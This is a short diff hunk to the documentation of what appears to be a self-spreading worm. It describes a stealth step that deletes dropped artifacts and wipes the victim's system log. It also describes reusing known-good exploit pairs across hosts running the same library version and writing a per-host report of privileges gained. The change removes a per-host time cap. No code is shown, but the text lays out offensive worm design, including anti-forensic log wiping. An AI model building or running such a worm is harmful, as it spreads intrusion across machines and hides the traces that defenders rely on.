@@ -51,8 +51,7 @@ alive:
 7. **Stealth**: dropped artifacts deleted, victim `/var/system.log`
    wiped (best-effort — root-owned). State saved after EVERY host.
 
-Per-host firing is budget-capped (default 120s, `-budget=`) so one
-stubborn box cannot stall the frontier. WINNER lines (known-good
+WINNER lines (known-good
 exploit pairs per library version) accumulate in `~/worm.wins` and
 fire first on every host running the same version. The worm writes a
 per-host digest to `~/Desktop/wormreport.txt` — best privilege
